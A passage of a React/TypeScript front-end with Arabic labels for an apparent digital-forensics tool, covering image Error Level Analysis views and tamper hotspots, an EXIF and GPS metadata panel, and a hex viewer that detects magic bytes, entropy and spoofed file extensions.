                          notifyStatus('تعذر تحميل الصورة عبر Canvas بسبب قيود CORS للمصدر الخارجي. يرجى رفع الصورة من جهازك.', 'warning');
                        };
                        img.src = ev.fileUrl;
                      }}
                      className="px-3 py-2 bg-gray-950 border border-gray-700 rounded-xl text-xs text-gray-200 focus:outline-none focus:border-[#D4AF37] max-w-[220px]"
                    >
                      <option value="">فحص صورة من سجل الأدلة...</option>
                      {evidenceList
                        .filter(ev => ev.mimeType.startsWith('image/') || /\.(jpg|jpeg|png|webp|gif|bmp)$/i.test(ev.fileName))
                        .map(ev => (
                          <option key={ev.id} value={ev.id}>{ev.fileName}</option>
                        ))}
                    </select>
                  )}
                </div>
              </div>

              {/* Interactive Canvas ELA Sensitivity, Quality, Mode & Metrics Controls */}
              {selectedImage && (
                <div className="bg-gray-950 border border-gray-800 rounded-xl p-4 space-y-4">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div className="flex items-center gap-3">
                      <span className="text-xs text-gray-300 font-medium whitespace-nowrap">تضخيم الفروقات (ELA Gain):</span>
                      <input
                        type="range"
                        min={10}
                        max={80}
                        step={5}
                        value={elaSlider}
                        onChange={(e) => regenerateElaWithConfig(Number(e.target.value), elaQuality, elaMode)}
                        className="flex-1 accent-[#D4AF37] cursor-pointer"
                      />
                      <span className="px-2.5 py-1 rounded bg-[#D4AF37]/15 text-[#D4AF37] font-mono text-xs font-bold">
                        ×{elaSlider}
                      </span>
                    </div>

                    <div className="flex items-center gap-3">
                      <span className="text-xs text-gray-300 font-medium whitespace-nowrap">جودة إعادة الضغط (JPEG Quality):</span>
                      <input
                        type="range"
                        min={50}
                        max={95}
                        step={5}
                        value={elaQuality}
                        onChange={(e) => regenerateElaWithConfig(elaSlider, Number(e.target.value), elaMode)}
                        className="flex-1 accent-emerald-400 cursor-pointer"
                      />
                      <span className="px-2.5 py-1 rounded bg-emerald-500/15 text-emerald-400 font-mono text-xs font-bold">
                        {elaQuality}%
                      </span>
                    </div>
                  </div>

                  <div className="flex flex-wrap items-center justify-between gap-3 pt-3 border-t border-gray-800/80">
                    <div className="flex flex-wrap items-center gap-2">
                      <span className="text-[11px] text-gray-400">وضع التحليل البصري (Canvas):</span>
                      {[
                        { id: 'heatmap' as const, label: 'خريطة حرارية (Thermal)' },
                        { id: 'rgb' as const, label: 'فروقات RGB' },
                        { id: 'grayscale' as const, label: 'تدرج رمادي (Luminance)' },
                      ].map(m => (
                        <button
                          key={m.id}
                          type="button"
                          onClick={() => regenerateElaWithConfig(elaSlider, elaQuality, m.id)}
                          className={`px-3 py-1.5 rounded-lg text-xs font-bold transition border ${
                            elaMode === m.id
                              ? 'bg-[#D4AF37] text-gray-950 border-[#D4AF37]'
                              : 'bg-gray-900 text-gray-300 border-gray-800 hover:border-gray-700'
                          }`}
                        >
                          {m.label}
                        </button>
                      ))}
                    </div>

                    <div className="flex flex-wrap items-center gap-2">
                      <div className="flex bg-gray-900 border border-gray-800 rounded-lg p-0.5 text-[11px]">
                        <button
                          type="button"
                          onClick={() => setElaViewLayout('side-by-side')}
                          className={`px-2.5 py-1 rounded-md font-bold transition ${elaViewLayout === 'side-by-side' ? 'bg-emerald-500 text-gray-950' : 'text-gray-400 hover:text-white'}`}
                        >
                          مقارنة متجاورة
                        </button>
                        <button
                          type="button"
                          onClick={() => setElaViewLayout('split')}
                          className={`px-2.5 py-1 rounded-md font-bold transition ${elaViewLayout === 'split' ? 'bg-emerald-500 text-gray-950' : 'text-gray-400 hover:text-white'}`}
                        >
                          منزلق التطابق
                        </button>
                      </div>

                      <label className="inline-flex items-center gap-1.5 text-[11px] text-red-400 bg-gray-900 border border-gray-800 px-2.5 py-1.5 rounded-lg cursor-pointer select-none">
                        <input
                          type="checkbox"
                          checked={elaShowHotspots}
                          onChange={(e) => setElaShowHotspots(e.target.checked)}
                          className="accent-red-500"
                        />
                        إبراز بؤر التلاعب ({elaMetrics?.suspiciousBlocksCount || 0})
                      </label>

                      {elaImage && (
                        <a
                          href={elaImage}
                          download={`ELA_${elaMode}_${analysisResult?.fileName || 'evidence'}.png`}
                          className="px-3 py-1.5 bg-gray-900 hover:bg-gray-800 text-[#D4AF37] border border-gray-700 rounded-lg text-xs font-bold inline-flex items-center gap-1.5 transition"
                        >
                          <Download className="w-3.5 h-3.5" />
                          تنزيل خريطة ELA
                        </a>
                      )}
                    </div>
                  </div>
                </div>
              )}

              {/* Real Canvas Pixel ELA Forensic Metrics */}
              {elaMetrics && (
                <div className="space-y-3">
                  <div className="grid grid-cols-2 lg:grid-cols-4 gap-3">
                    <div className={`p-3.5 rounded-xl border ${
                      elaMetrics.elaTamperScore >= 65
                        ? 'bg-red-500/10 border-red-500/40'
                        : elaMetrics.elaTamperScore >= 38
                        ? 'bg-amber-500/10 border-amber-500/30'
                        : 'bg-emerald-500/10 border-emerald-500/30'
                    }`}>
                      <div className="text-[10px] font-mono text-gray-400 uppercase">احتمال التلاعب الموضعي (Canvas ELA)</div>
                      <div className={`text-2xl font-bold font-mono mt-1 ${
                        elaMetrics.elaTamperScore >= 65 ? 'text-red-400' : elaMetrics.elaTamperScore >= 38 ? 'text-amber-400' : 'text-emerald-400'
                      }`}>
                        {elaMetrics.elaTamperScore}%
                      </div>
                    </div>
                    <div className="bg-gray-950 border border-gray-800 p-3.5 rounded-xl">
                      <div className="text-[10px] font-mono text-gray-400 uppercase">بؤر الشذوذ الضغطي (16×16 Grid)</div>
                      <div className="text-2xl font-bold font-mono text-[#D4AF37] mt-1">
                        {elaMetrics.suspiciousBlocksCount} <span className="text-xs text-gray-500">/ {elaMetrics.totalBlocks} كتلة</span>
                      </div>
                    </div>
                    <div className="bg-gray-950 border border-gray-800 p-3.5 rounded-xl">
                      <div className="text-[10px] font-mono text-gray-400 uppercase">متوسط وذروة خطأ البكسل</div>
                      <div className="text-lg font-bold font-mono text-white mt-1" dir="ltr">
                        Avg {elaMetrics.meanError} / Peak {elaMetrics.peakError}
                      </div>
                    </div>
                    <div className="bg-gray-950 border border-gray-800 p-3.5 rounded-xl">
                      <div className="text-[10px] font-mono text-gray-400 uppercase">تباين لابلاس وضوضاء الحساس</div>
                      <div className="text-lg font-bold font-mono text-blue-400 mt-1" dir="ltr">
                        L={analysisResult?.laplacianVariance ?? 0} • N={analysisResult?.sensorGrainNoise ?? 0}
                      </div>
                    </div>
                  </div>
                  <div className="bg-gray-950 border border-gray-800 rounded-xl px-4 py-3 text-xs text-gray-200 flex items-center gap-2.5">
                    <ShieldCheck className="w-4 h-4 text-[#D4AF37] shrink-0" />
                    <span>{elaMetrics.verdictSummary}</span>
                  </div>
                </div>
              )}

              {elaImage ? (
                elaViewLayout === 'split' ? (
                  <div className="space-y-3">
                    <div className="flex items-center justify-between text-xs text-gray-400">
                      <span>مقارنة التطابق التفاعلية (اسحب المنزلق لمطابقة الأصل مع خريطة Canvas ELA)</span>
                      <span className="font-mono text-[#D4AF37]">{elaComparisonPct}% ELA Overlay</span>
                    </div>
                    <div className="relative rounded-xl overflow-hidden bg-black border border-gray-800 max-h-[480px] aspect-video mx-auto select-none">
                      <img src={selectedImage || ''} alt="Original" className="w-full h-full object-contain" />
                      <div
                        className="absolute inset-0 overflow-hidden pointer-events-none"
                        style={{ clipPath: `inset(0 ${100 - elaComparisonPct}% 0 0)` }}
                      >
                        <img src={elaImage} alt="ELA Overlay" className="w-full h-full object-contain" />
                      </div>
                      {elaShowHotspots && elaMetrics?.hotspots.map((h, i) => (
                        <div
                          key={`${h.col}-${h.row}-${i}`}
                          title={`منطقة شاذة: Z-Score ${h.zScore} | Mean Error ${h.meanError}`}
                          className="absolute border-2 border-red-500/80 bg-red-500/15 pointer-events-none"
                          style={{ left: `${h.xPct}%`, top: `${h.yPct}%`, width: `${h.wPct}%`, height: `${h.hPct}%` }}
                        />
                      ))}
                      <div
                        className="absolute top-0 bottom-0 w-0.5 bg-[#D4AF37] shadow-[0_0_8px_#D4AF37] pointer-events-none"
                        style={{ left: `${elaComparisonPct}%` }}
                      />
                    </div>
                    <input
                      type="range"
                      min={0}
                      max={100}
                      value={elaComparisonPct}
                      onChange={(e) => setElaComparisonPct(Number(e.target.value))}
                      className="w-full accent-[#D4AF37] cursor-ew-resize"
                    />
                  </div>
                ) : (
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div className="space-y-2">
                      <div className="flex items-center justify-between text-xs text-gray-400">
                        <span>الصورة الأصلية ({analysisResult?.fileName || imageName})</span>
                        <span className="font-mono text-gray-500">{analysisResult?.fileSizeFormatted}</span>
                      </div>
                      <div className="relative rounded-xl overflow-hidden bg-black border border-gray-800 aspect-video flex items-center justify-center">
                        <img src={selectedImage || ''} alt="Original" className="max-h-full max-w-full object-contain" />
                        {elaShowHotspots && elaMetrics?.hotspots.map((h, i) => (
                          <div
                            key={`orig-${h.col}-${h.row}-${i}`}
                            title={`بؤرة شاذة: Z-Score ${h.zScore}`}
                            className="absolute border border-red-500/80 bg-red-500/15 pointer-events-none"
                            style={{ left: `${h.xPct}%`, top: `${h.yPct}%`, width: `${h.wPct}%`, height: `${h.hPct}%` }}
                          />
                        ))}
                      </div>
                    </div>
                    <div className="space-y-2">
                      <div className="flex items-center justify-between text-xs text-gray-400">
                        <span>خريطة مستوى الخطأ Canvas ({elaMode.toUpperCase()} ×{elaSlider} @ Q{elaQuality}%)</span>
                        <span className="font-mono text-emerald-400">المناطق الحمراء/الساطعة = تباين ضغطي</span>
                      </div>
                      <div className="relative rounded-xl overflow-hidden bg-black border border-gray-800 aspect-video flex items-center justify-center">
                        <img src={elaImage} alt="ELA" className="max-h-full max-w-full object-contain" />
                        {elaShowHotspots && elaMetrics?.hotspots.map((h, i) => (
                          <div
                            key={`ela-${h.col}-${h.row}-${i}`}
                            title={`Z-Score ${h.zScore} | Error ${h.meanError}`}
                            className="absolute border border-red-400/90 pointer-events-none"
                            style={{ left: `${h.xPct}%`, top: `${h.yPct}%`, width: `${h.wPct}%`, height: `${h.hPct}%` }}
                          />
                        ))}
                      </div>
                    </div>
                  </div>
                )
              ) : (
                <div className="py-12 text-center text-gray-500 text-sm space-y-2">
                  <Camera className="w-10 h-10 text-gray-700 mx-auto" />
                  <p>اسحب وأفلت صورة هنا أو انقر "رفع صورة للفحص" لعرض خريطة Canvas ELA واستخراج بيانات EXIF والـ GPS.</p>
                </div>
              )}

              {elaMetrics && elaMetrics.hotspots.length > 0 && (
                <div className="bg-gray-950 border border-red-500/30 rounded-xl p-4 space-y-3">
                  <div className="flex flex-wrap items-center justify-between gap-2">
                    <h4 className="text-xs font-bold text-red-400 flex items-center gap-2">
                      <AlertTriangle className="w-4 h-4" />
                      جدول بؤر الشذوذ الضغطي المكتشفة بالـ Canvas (16×16 Grid Z-Score)
                    </h4>
                    <span className="text-[10px] font-mono text-gray-400">عرض أعلى {elaMetrics.hotspots.length} منطقة شاذة</span>
                  </div>
                  <div className="overflow-x-auto max-h-56 overflow-y-auto">
                    <table className="w-full text-right text-xs font-mono">
                      <thead className="bg-gray-900 text-gray-400 text-[10px] border-b border-gray-800">
                        <tr>
                          <th className="px-3 py-2">#</th>
                          <th className="px-3 py-2">موقع الشبكة (Col, Row)</th>
                          <th className="px-3 py-2">الإحداثيات (%)</th>
                          <th className="px-3 py-2">متوسط خطأ البكسل</th>
                          <th className="px-3 py-2">معامل الشذوذ (Z-Score)</th>
                          <th className="px-3 py-2">التصنيف</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-gray-800/60">
                        {elaMetrics.hotspots.map((h, idx) => (
                          <tr key={`${h.col}-${h.row}-${idx}`} className="hover:bg-gray-900/50">
                            <td className="px-3 py-2 text-gray-500">{idx + 1}</td>
                            <td className="px-3 py-2 text-white" dir="ltr">({h.col}, {h.row})</td>
                            <td className="px-3 py-2 text-gray-300" dir="ltr">{h.xPct}%, {h.yPct}%</td>
                            <td className="px-3 py-2 text-[#D4AF37]">{h.meanError}</td>
                            <td className="px-3 py-2 font-bold text-red-400">{h.zScore}σ</td>
                            <td className="px-3 py-2">
                              <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                                h.zScore >= 3.0
                                  ? 'bg-red-500/20 text-red-400 border border-red-500/30'
                                  : 'bg-amber-500/20 text-amber-400 border border-amber-500/30'
                              }`}>
                                {h.zScore >= 3.0 ? 'شذوذ مرتفع جداً' : 'تباين ملحوظ'}
                              </span>
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </div>
              )}
            </div>

            {/* Real Binary EXIF & GPS Intelligence Panel */}
            {analysisResult && (
              <div className="rounded-2xl bg-gray-900 border border-gray-800 p-6 space-y-6">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                  <div>
                    <h3 className="text-base font-bold text-white flex items-center gap-2">
                      <FileSearch className="w-5 h-5 text-emerald-400" />
                      محلل بيانات EXIF والـ GPS المستخرجة من البايتات الثنائية
                    </h3>
                    <p className="text-xs text-gray-400">
                      قراءة مباشرة من حاويات JPEG APP1 و PNG eXIf و WebP EXIF (IFD0 + Exif SubIFD + GPS IFD).
                    </p>
                  </div>
                  <span className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold border ${
                    analysisResult.exif.hasExif
                      ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30'
                      : 'bg-amber-500/10 text-amber-400 border-amber-500/30'
                  }`}>
                    {analysisResult.exif.hasExif
                      ? `EXIF موثق (${analysisResult.exif.containerFormat || 'TIFF'})`
                      : 'لا توجد بيانات EXIF (Stripped)'}
                  </span>
                </div>

                {!analysisResult.exif.hasExif ? (
                  <div className="bg-amber-500/5 border border-amber-500/20 rounded-xl p-5 flex items-start gap-3 text-amber-300 text-xs leading-relaxed">
                    <AlertTriangle className="w-5 h-5 shrink-0 mt-0.5 text-amber-400" />
                    <div>
                      <div className="font-bold mb-1">تنبيه جنائي: لا توجد بيانات EXIF مدمجة في هذا الملف</div>
                      <p className="text-gray-300">
                        {analysisResult.exif.message || 'تم تجريد الميتاداتا أو إعادة حفظ الصورة عبر تطبيقات المراسلة أو أدوات التعديل.'}
                      </p>
                    </div>
                  </div>
                ) : (
                  <div className="space-y-6">
                    <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
                      {/* Capture Timestamps Card */}
                      <div className="bg-gray-950 border border-gray-800 rounded-xl p-4 space-y-3">
                        <div className="flex items-center gap-2 text-[#D4AF37] text-xs font-bold">
                          <Clock className="w-4 h-4" />
                          تواريخ الالتقاط والتعديل (Timestamps)
                        </div>
                        <div className="space-y-2 text-xs">
                          <div className="flex items-center justify-between gap-2 border-b border-gray-800/70 pb-1.5">
                            <span className="text-gray-400">تاريخ الالتقاط الأصلي:</span>
                            <span className="font-mono text-white font-bold" dir="ltr">
                              {analysisResult.exif.dateTimeOriginal || analysisResult.exif.dateTime || 'غير متوفر'}
                            </span>
                          </div>
                          <div className="flex items-center justify-between gap-2 border-b border-gray-800/70 pb-1.5">
                            <span className="text-gray-400">تاريخ الرقمنة:</span>
                            <span className="font-mono text-gray-300" dir="ltr">
                              {analysisResult.exif.dateTimeDigitized || '—'}
                            </span>
                          </div>
                          <div className="flex items-center justify-between gap-2">
                            <span className="text-gray-400">آخر تعديل للملف:</span>
                            <span className="font-mono text-gray-300" dir="ltr">
                              {analysisResult.exif.dateTime || '—'}
                            </span>
                          </div>
                        </div>
                      </div>

                      {/* GPS Geolocation Card */}
                      <div className={`bg-gray-950 border rounded-xl p-4 space-y-3 ${
                        analysisResult.exif.gps ? 'border-emerald-500/40' : 'border-gray-800'
                      }`}>
                        <div className="flex items-center justify-between">
                          <div className="flex items-center gap-2 text-emerald-400 text-xs font-bold">
                            <MapPin className="w-4 h-4" />
                            الموقع الجغرافي (GPS Coordinates)
                          </div>
                          {analysisResult.exif.gps && (
                            <button
                              onClick={() => copyToClipboard(`${analysisResult.exif.gps!.latitude}, ${analysisResult.exif.gps!.longitude}`, 'gps-coords')}
                              className="px-2 py-0.5 bg-gray-900 hover:bg-gray-800 border border-gray-700 rounded text-[10px] text-gray-300 inline-flex items-center gap-1"
                            >
                              {copiedHash === 'gps-coords' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                              نسخ
                            </button>
                          )}
                        </div>
                        {analysisResult.exif.gps ? (
                          <div className="space-y-2 text-xs">
                            <div className="flex items-center justify-between gap-2 border-b border-gray-800/70 pb-1.5">
                              <span className="text-gray-400">الإحداثيات العشرية:</span>
                              <span className="font-mono text-emerald-400 font-bold select-all" dir="ltr">
                                {analysisResult.exif.gps.latitude}, {analysisResult.exif.gps.longitude}
                              </span>
                            </div>
                            <div className="flex items-center justify-between gap-2 border-b border-gray-800/70 pb-1.5">
                              <span className="text-gray-400">صيغة DMS:</span>
                              <span className="font-mono text-gray-200 text-[11px]" dir="ltr">
                                {analysisResult.exif.gps.latitudeDms} | {analysisResult.exif.gps.longitudeDms}
                              </span>
                            </div>
                            <div className="flex items-center justify-between gap-2">
                              <span className="text-gray-400">الارتفاع / التوقيت:</span>
                              <span className="font-mono text-gray-300 text-[11px]" dir="ltr">
                                {analysisResult.exif.gps.altitude !== undefined ? `${analysisResult.exif.gps.altitude}m` : '—'}
                                {analysisResult.exif.gps.dateStamp ? ` • ${analysisResult.exif.gps.dateStamp}` : ''}
                                {analysisResult.exif.gps.timeStamp ? ` ${analysisResult.exif.gps.timeStamp}` : ''}
                              </span>
                            </div>
                            <a
                              href={`https://maps.google.com/?q=${analysisResult.exif.gps.latitude},${analysisResult.exif.gps.longitude}`}
                              target="_blank"
                              rel="noopener noreferrer"
                              className="mt-1 w-full py-1.5 bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 rounded-lg text-[11px] font-bold flex items-center justify-center gap-1.5 transition"
                            >
                              <ExternalLink className="w-3.5 h-3.5" />
                              فتح الموقع على الخريطة (Google Maps)
                            </a>
                          </div>
                        ) : (
                          <div className="text-xs text-gray-500 py-3">
                            لا تحتوي ترويسة الصورة على بيانات GPS IFD (إما تم تعطيل الموقع في الكاميرا أو إزالته).
                          </div>
                        )}
                      </div>

                      {/* Camera & Optical Telemetry Card */}
                      <div className="bg-gray-950 border border-gray-800 rounded-xl p-4 space-y-3">
                        <div className="flex items-center gap-2 text-blue-400 text-xs font-bold">
                          <Camera className="w-4 h-4" />
                          بصمة الجهاز وإعدادات العدسة
                        </div>
                        <div className="space-y-2 text-xs">
                          <div className="flex items-center justify-between gap-2 border-b border-gray-800/70 pb-1.5">
                            <span className="text-gray-400">الشركة / الطراز:</span>
                            <span className="font-mono text-white truncate" dir="ltr">
                              {[analysisResult.exif.make, analysisResult.exif.model].filter(Boolean).join(' ') || 'غير محدد'}
                            </span>
                          </div>
                          <div className="flex items-center justify-between gap-2 border-b border-gray-800/70 pb-1.5">
                            <span className="text-gray-400">البرمجية (Software):</span>
                            <span className="font-mono text-gray-300 truncate" dir="ltr">
                              {analysisResult.exif.software || '—'}
                            </span>
                          </div>
                          <div className="flex items-center justify-between gap-2">
                            <span className="text-gray-400">إعدادات التعريض:</span>
                            <span className="font-mono text-gray-300 text-[11px]" dir="ltr">
                              {[
                                analysisResult.exif.focalLength,
                                analysisResult.exif.fNumber,
                                analysisResult.exif.exposureTime,
                                analysisResult.exif.iso,
                              ].filter(Boolean).join(' • ') || '—'}
                            </span>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* Raw Decoded TIFF/EXIF Tags Table */}
                    {analysisResult.exif.rawTags && analysisResult.exif.rawTags.length > 0 && (
                      <div className="bg-gray-950 border border-gray-800 rounded-xl overflow-hidden">
                        <div className="px-4 py-2.5 bg-gray-900/80 border-b border-gray-800 text-xs font-bold text-gray-300 flex items-center justify-between">
                          <span>سجل وسوم EXIF الثنائية المستخرجة ({analysisResult.exif.rawTags.length} وسم)</span>
                          <span className="font-mono text-[10px] text-gray-500">IFD0 / ExifIFD / GPS</span>
                        </div>
                        <div className="overflow-x-auto max-h-60 overflow-y-auto">
                          <table className="w-full text-xs text-right">
                            <thead className="bg-gray-900/50 text-gray-400 font-mono text-[10px]">
                              <tr>
                                <th className="px-4 py-2">IFD</th>
                                <th className="px-4 py-2">Tag ID</th>
                                <th className="px-4 py-2">اسم الوسم</th>
                                <th className="px-4 py-2">القيمة المستخرجة</th>
                              </tr>
                            </thead>
                            <tbody className="divide-y divide-gray-800/60">
                              {analysisResult.exif.rawTags.map((tag, idx) => (
                                <tr key={`${tag.ifd}-${tag.tagId}-${idx}`} className="hover:bg-gray-900/40">
                                  <td className="px-4 py-2 font-mono text-[11px] text-[#D4AF37]">{tag.ifd}</td>
                                  <td className="px-4 py-2 font-mono text-[11px] text-gray-400">{tag.tagId}</td>
                                  <td className="px-4 py-2 text-gray-200">{tag.name}</td>
                                  <td className="px-4 py-2 font-mono text-emerald-400 select-all" dir="ltr">{tag.value}</td>
                                </tr>
                              ))}
                            </tbody>
                          </table>
                        </div>
                      </div>
                    )}
                  </div>
                )}
              </div>
            )}
          </div>
        )}

        {isTabVisible('hex') && (() => {
          const activeHex = hexInspectorData || (analysisResult ? {
            fileName: analysisResult.fileName,
            totalBytes: analysisResult.fileSize,
            bytes: analysisResult.hexBytes,
            headerHex: analysisResult.headerHex || analysisResult.hexBytes.slice(0, 16).join(' '),
            headerAscii: analysisResult.headerAscii || '',
            detectedFileType: analysisResult.detectedFileType,
            expectedExtensions: analysisResult.expectedExtensions || [],
            entropy: analysisResult.entropy ?? 0,
            entropyClassification: analysisResult.entropyClassification || 'غير مصنف',
            isMasqueraded: Boolean(analysisResult.isMasqueraded),
            masqueradeWarning: analysisResult.masqueradeWarning || null,
          } : null);

          const bytesPerPage = 256;
          const totalLoaded = activeHex?.bytes.length || 0;
          const safeOffset = hexPageOffset >= totalLoaded ? 0 : hexPageOffset;
          const pageBytes = activeHex ? activeHex.bytes.slice(safeOffset, safeOffset + bytesPerPage) : [];
          const rowsCount = Math.ceil(pageBytes.length / 16);
          const qNorm = hexSearchQuery.trim().toLowerCase();
          const selectedHexVal = hexSelectedByteIndex !== null && activeHex ? activeHex.bytes[hexSelectedByteIndex] : null;
          const selectedDecVal = selectedHexVal ? parseInt(selectedHexVal, 16) : null;

          const handleHexFileInput = async (file: File) => {
            const buf = await file.arrayBuffer();
            const binaryInfo = await analyzeFileBinary(buf, file.name, file.type || 'application/octet-stream');
            setHexInspectorData({
              fileName: file.name,
              totalBytes: binaryInfo.totalByteLength || file.size,
              bytes: binaryInfo.extendedHexBytes || binaryInfo.hexBytes,
              headerHex: binaryInfo.headerHex,
              headerAscii: binaryInfo.headerAscii,
              detectedFileType: binaryInfo.detectedFileType,
              expectedExtensions: binaryInfo.expectedExtensions,
              entropy: binaryInfo.entropy,
              entropyClassification: binaryInfo.entropyClassification,
              isMasqueraded: binaryInfo.isMasqueraded,
              masqueradeWarning: binaryInfo.masqueradeWarning,
            });
            setHexPageOffset(0);
            setHexSelectedByteIndex(0);
            recordCustodyLedgerBlock(
              `hex-${binaryInfo.sha256.substring(0, 16)}`,
              'FILE_INSPECTION',
              `فحص البايتات السحرية والـ Hex للملف (${file.name})`,
              'عارض Hex وقارئ الترويسات السحرية',
              `SHA-256=${binaryInfo.sha256.substring(0, 20)}... | Header=${binaryInfo.headerHex} | Type=${binaryInfo.detectedFileType}`
            );
            notifyStatus(`تمت قراءة ${binaryInfo.extendedHexBytes?.length || binaryInfo.hexBytes.length} بايت من (${file.name}) وكشف الترويسة السحرية.`, 'success');
          };

          return (
            <div className="space-y-6">
              {/* Interactive File Loader + Evidence Selector */}
              <div
                onDragOver={(e) => { e.preventDefault(); setIsDraggingHex(true); }}
                onDragLeave={() => setIsDraggingHex(false)}
                onDrop={(e) => {
                  e.preventDefault();
                  setIsDraggingHex(false);
                  const dropped = e.dataTransfer.files?.[0];
                  if (dropped) handleHexFileInput(dropped);
                }}
                className={`rounded-2xl bg-gray-900 border-2 border-dashed p-6 space-y-5 transition ${
                  isDraggingHex ? 'border-[#D4AF37] bg-[#D4AF37]/5' : 'border-gray-800'
                }`}
              >
                <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
                  <div>
                    <h2 className="text-lg font-bold text-white flex items-center gap-2">
                      <Code className="w-5 h-5 text-[#D4AF37]" />
                      عارض Hex الفعلي وقارئ الترويسات السحرية (Hex Viewer & Magic Bytes Reader)
                    </h2>
                    <p className="text-xs text-gray-400">
                      استعراض تفاعلي ثنائي الجانب (Offset / Hex / ASCII) حتى 4 كيلوبايت، مع كشف تلقائي للترويسات السحرية وفضح امتدادات الملفات المموهة.
                    </p>
                  </div>
                  <div className="flex flex-wrap items-center gap-2">
                    <label className="cursor-pointer px-4 py-2 bg-[#D4AF37] hover:bg-[#c29f30] text-gray-950 font-bold rounded-xl text-xs transition inline-flex items-center gap-2">
                      <Upload className="w-4 h-4" />
                      فتح أي ملف في عارض Hex
                      <input
                        type="file"
                        onChange={(e) => {
                          const f = e.target.files?.[0];
                          e.target.value = '';
                          if (f) handleHexFileInput(f);
                        }}
                        className="hidden"
                      />
                    </label>
                    {evidenceList.length > 0 && (
                      <select
                        value=""
                        onChange={async (e) => {
                          const ev = evidenceList.find(item => item.id === e.target.value);
                          if (!ev) return;
                          const cached = localFilesCacheRef.current.get(ev.sha256);
                          if (cached) {
                            const buf = await cached.blob.arrayBuffer();
                            const binaryInfo = await analyzeFileBinary(buf, ev.fileName, ev.mimeType);
                            setHexInspectorData({
                              fileName: ev.fileName,
                              totalBytes: binaryInfo.totalByteLength || ev.fileSize,
                              bytes: binaryInfo.extendedHexBytes || binaryInfo.hexBytes,
                              headerHex: binaryInfo.headerHex,
                              headerAscii: binaryInfo.headerAscii,
                              detectedFileType: binaryInfo.detectedFileType,
                              expectedExtensions: binaryInfo.expectedExtensions,
                              entropy: binaryInfo.entropy,
                              entropyClassification: binaryInfo.entropyClassification,
                              isMasqueraded: binaryInfo.isMasqueraded,
                              masqueradeWarning: binaryInfo.masqueradeWarning,
                            });
                          } else {
                            setHexInspectorData({
                              fileName: ev.fileName,
                              totalBytes: ev.fileSize,
                              bytes: ev.analysis.hexBytes || [],
                              headerHex: ev.analysis.headerHex || (ev.analysis.hexBytes || []).slice(0, 16).join(' '),
                              headerAscii: ev.analysis.headerAscii || '',
                              detectedFileType: ev.analysis.detectedFileType,
                              expectedExtensions: ev.analysis.expectedExtensions || [],
                              entropy: ev.analysis.entropy ?? 0,
                              entropyClassification: ev.analysis.entropyClassification || 'طبيعي',
                              isMasqueraded: Boolean(ev.analysis.isMasqueraded),
                              masqueradeWarning: ev.analysis.masqueradeWarning || null,
                            });
                          }
                          setHexPageOffset(0);
                          setHexSelectedByteIndex(0);
                        }}
                        className="px-3 py-2 bg-gray-950 border border-gray-700 rounded-xl text-xs text-gray-200 focus:outline-none focus:border-[#D4AF37]"
                      >
                        <option value="">اختيار دليل من السجل ({evidenceList.length})...</option>
                        {evidenceList.map(ev => (
                          <option key={ev.id} value={ev.id}>{ev.fileName}</option>
                        ))}
                      </select>
                    )}
                  </div>
                </div>

                {activeHex ? (
                  <div className="space-y-6">
                    {activeHex.isMasqueraded && (
                      <div className="bg-red-500/10 border border-red-500/30 p-4 rounded-2xl flex items-start gap-3 text-red-400">
                        <AlertOctagon className="w-5 h-5 shrink-0 mt-0.5" />
                        <div className="space-y-1">
                          <div className="text-xs font-bold">تحذير تزوير حرج (Masquerade / Extension Spoofing Detected)</div>
                          <p className="text-xs leading-relaxed">{activeHex.masqueradeWarning}</p>
                        </div>
                      </div>
                    )}

                    <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
                      <div className="bg-gray-950 border border-gray-800 p-4 rounded-xl space-y-1">
                        <span className="text-[10px] text-gray-500 uppercase font-mono">اسم الملف والحجم الكلي</span>
                        <div className="text-xs font-bold text-white truncate" title={activeHex.fileName}>{activeHex.fileName}</div>
                        <div className="text-[11px] font-mono text-gray-400">{formatFileSize(activeHex.totalBytes)} ({activeHex.bytes.length} بايت معروض)</div>
                      </div>
                      <div className="bg-gray-950 border border-gray-800 p-4 rounded-xl space-y-1">
                        <span className="text-[10px] text-gray-500 uppercase font-mono">نوع الملف الفعلي (Magic Bytes)</span>
                        <div className="text-xs font-bold text-emerald-400">{activeHex.detectedFileType}</div>
                        {activeHex.expectedExtensions.length > 0 && (
                          <div className="text-[10px] font-mono text-gray-500" dir="ltr">Ext: .{activeHex.expectedExtensions.join(', .')}</div>
                        )}
                      </div>
                      <div className="bg-gray-950 border border-gray-800 p-4 rounded-xl space-y-1">
                        <span className="text-[10px] text-gray-500 uppercase font-mono">إنتروبيا شانون (Shannon Entropy)</span>
                        <div className="text-xs font-bold font-mono text-[#D4AF37]">{activeHex.entropy} / 8.0</div>
                        <div className="text-[11px] text-gray-400 truncate">{activeHex.entropyClassification}</div>
                      </div>
                      <div className="bg-gray-950 border border-gray-800 p-4 rounded-xl space-y-1">
                        <span className="text-[10px] text-gray-500 uppercase font-mono">الترويسة السحرية (First 16B)</span>
                        <div className="text-[11px] font-mono text-emerald-400 truncate select-all" dir="ltr">{activeHex.headerHex}</div>
                        <div className="text-[11px] font-mono text-[#D4AF37] truncate select-all" dir="ltr">{activeHex.headerAscii || '—'}</div>
                      </div>
                    </div>

                    {/* Search + Selected Byte Decoder + Pagination */}
                    <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
                      <div className="lg:col-span-2 bg-gray-950 border border-gray-800 rounded-xl p-3 flex flex-col sm:flex-row sm:items-center gap-3">
                        <div className="relative flex-1">
                          <Search className="w-4 h-4 text-gray-500 absolute right-3 top-1/2 -translate-y-1/2" />
                          <input
                            type="text"
                            value={hexSearchQuery}
                            onChange={(e) => setHexSearchQuery(e.target.value)}
